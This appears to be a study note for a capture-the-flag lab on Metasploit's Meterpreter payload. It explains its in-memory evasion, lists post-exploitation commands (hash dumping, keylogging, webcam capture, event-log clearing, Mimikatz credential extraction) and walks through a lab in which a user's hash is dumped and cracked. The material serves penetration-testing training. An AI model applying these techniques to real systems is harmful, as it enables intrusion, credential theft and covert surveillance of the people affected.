# Metasploit: Meterpreter

## Overview

Meterpreter is Metasploit's advanced payload that runs entirely in memory on the target system, communicates over an encrypted channel, and provides a rich set of post-exploitation capabilities. This room covers how Meterpreter works, its available commands, post-exploitation techniques, and a full challenge walkthrough.

---

## Topics Covered

- How Meterpreter works (in-memory, encrypted)
- Meterpreter vs regular shells
- Staged vs inline Meterpreter payloads
- Core, filesystem, networking, and system commands
- Migration, hashdump, search, shell
- Post-exploitation with Kiwi and post modules
- Full post-exploitation challenge walkthrough

---

## Key Concepts

### How Meterpreter Works

Meterpreter is loaded directly into memory on the target — it does not write files to disk. This provides two key advantages:

- **Antivirus evasion** — most AV scans files on disk; a memory-resident payload avoids triggering file-based detection
- **IDS/IPS evasion** — Meterpreter communicates over an encrypted channel (TLS), making traffic inspection harder

Meterpreter appears as a legitimate running process (e.g. `spoolsv.exe`) rather than a recognisable malicious executable. Even DLL inspection won't immediately reveal Meterpreter.

---

### Choosing a Meterpreter Version

Meterpreter versions are available for: Android, Apple iOS, Java, Linux, macOS, PHP, Python, Windows.

**Selection factors:**
1. Target OS
2. Installed components on target (Python? PHP?)
3. Available network connection type (raw TCP? HTTPS only? IPv6?)

```bash
msfvenom --list payloads | grep meterpreter
```

---

### Meterpreter Command Categories

#### Core Commands

```
background          # Background the current session
exit                # Terminate the Meterpreter session
guid                # Get the session GUID
help                # Display all available commands
info                # Display info about a Post module
irb                 # Open an interactive Ruby shell
load                # Load a Meterpreter extension
migrate             # Migrate to another process
run                 # Execute a Meterpreter script or Post module
sessions            # Switch to another session
```

#### File System Commands

```
cd                  # Change directory
ls / dir            # List files in current directory
pwd                 # Print working directory
cat                 # Display file contents
edit                # Edit a file
rm                  # Delete a file
search              # Search for files
upload              # Upload a file or directory
download            # Download a file or directory
```

#### Networking Commands

```
arp                 # Display ARP cache
ifconfig            # Display network interfaces
netstat             # Display network connections
portfwd             # Forward a local port to a remote service
route               # View and modify the routing table
```

#### System Commands

```
clearev             # Clear event logs
execute             # Execute a command
getpid              # Show current process ID
getuid              # Show current user
kill                # Terminate a process by PID
pkill               # Terminate processes by name
ps                  # List running processes
reboot              # Reboot the remote computer
shell               # Drop into a system command shell
shutdown            # Shut down the remote computer
sysinfo             # Get system information (OS, hostname, etc.)
```

#### Other Useful Commands

```
idletime            # Return seconds since the remote user was last active
getsystem           # Attempt to elevate privileges to SYSTEM
hashdump            # Dump SAM database password hashes
keyscan_start       # Start capturing keystrokes
keyscan_stop        # Stop capturing keystrokes
keyscan_dump        # Dump captured keystrokes
screenshot          # Take a screenshot of the desktop
screenshare         # Watch the remote desktop in real time
record_mic          # Record audio from the microphone
webcam_snap         # Take a webcam snapshot
```

---

### Key Post-Exploitation Techniques

**`getuid`** — Check current privilege level:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**`ps`** — List running processes to identify migration targets or suspicious processes.

**`migrate <PID>`** — Migrate Meterpreter to another process. Useful for:
- Keylogging (migrate to a word processor)
- Stability (migrate to a long-running process)
- Evasion (hide within a legitimate process)

**`hashdump`** — Dump the SAM database (requires SYSTEM privileges):

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Hashes can be cracked offline or used in Pass-the-Hash attacks.

**`search`** — Find files on the target:

```
meterpreter > search -f secrets.txt
meterpreter > search -f *.txt -d c:\users
```

**`shell`** — Drop into a Windows command shell:

```
meterpreter > shell
C:\Windows\system32> whoami
CTRL+Z to return to Meterpreter
```

**`load kiwi`** — Load the Kiwi extension (Mimikatz integration):

```
meterpreter > load kiwi
meterpreter > help    # New kiwi commands appear
meterpreter > creds_all
```

---

## Practical Examples / Demonstrations

### Post-Exploitation Challenge Walkthrough

**Setup:**

```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <MACHINE_IP>
msf6 > set SMBUser ballen
msf6 > set SMBPass Password1
msf6 > exploit
```

**Q: What is the computer name?**

```
meterpreter > sysinfo
# Computer: ACME-TEST
```

**Q: What is the target domain?**

```
meterpreter > sysinfo
# Domain: FLASH
```

**Q: What is the name of the share likely created by the user?**

```
msf6 > use post/windows/gather/enum_shares
msf6 > set SESSION 1
msf6 > run
# Share: speedster
```

**Q: What is the NTLM hash of the jchambers user?**

```
meterpreter > hashdump
# jchambers:...:69596c7aa1e8daee17f8e78870e25a5c:::
```

**Q: What is the cleartext password of jchambers?**

Paste the NTLM hash into https://crackstation.net/

```
# Answer: Trustno1
```

**Q: Where is secrets.txt?**

```
meterpreter > search -f secrets.txt
# c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

**Q: What is the Twitter password in secrets.txt?**

```
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
# KDSvbsw3849!
```

**Q: Where is realsecret.txt?**

```
meterpreter > search -f realsecret.txt
# c:\inetpub\wwwroot\realsecret.txt
```

**Q: What is the real secret?**

```
meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
# The Flash is the fastest man alive
```

---

## Important Terminology

| Term | Definition |
|---|---|
| Meterpreter | Metasploit's advanced in-memory payload with rich post-exploitation features |
| `migrate` | Move Meterpreter to a different running process |
| `hashdump` | Dump NTLM password hashes from the Windows SAM database |
| SAM | Security Account Manager — stores Windows local account password hashes |
| `getsystem` | Attempt to escalate privileges to SYSTEM level |
| `load kiwi` | Load Mimikatz functionality into Meterpreter |
| Pass-the-Hash | Using an NTLM hash to authenticate without knowing the plaintext password |
| `portfwd` | Forward traffic from a local port through the Meterpreter session |
| `clearev` | Clear Windows event logs to remove evidence of compromise |

---

## Real-World Relevance

- Meterpreter's in-memory operation is the standard approach for avoiding AV detection in modern engagements — file-based payloads are far more likely to be caught
- `migrate` to a stable process (e.g. `explorer.exe`, `winlogon.exe`) prevents session loss if the original exploited process exits
- `hashdump` is a primary post-exploitation step on Windows — NTLM hashes enable Pass-the-Hash lateral movement
- Kiwi/Mimikatz integration (`load kiwi`) allows extraction of plaintext credentials from LSASS memory — a critical step in AD compromises
- `clearev` removes event log evidence — defenders should monitor for this and use centralized logging (SIEM) where logs can't be deleted by a compromised endpoint
- `portfwd` enables pivoting — forwarding ports through the Meterpreter session to reach otherwise inaccessible internal services

---

## Key Learnings

- Meterpreter runs in memory and communicates over encrypted channels — avoids most file-based AV and network inspection
- Choose the Meterpreter version based on target OS, available components, and network constraints
- Core commands (`background`, `migrate`, `getsystem`) manage the session
- `hashdump` retrieves NTLM hashes for cracking or Pass-the-Hash
- `search` locates files; `cat` reads them; `shell` drops to a command prompt
- `load kiwi` adds Mimikatz capabilities for credential extraction
- Post modules (`post/windows/gather/enum_shares`) extend Meterpreter's capabilities significantly

---

## Conclusion

Meterpreter is the most capable payload in the Metasploit arsenal. Its in-memory operation, encrypted communications, and rich command set make it the preferred payload for post-exploitation on Windows targets. Mastering its commands — especially `migrate`, `hashdump`, `getsystem`, and `load kiwi` — is essential for any penetration tester working in Windows environments.
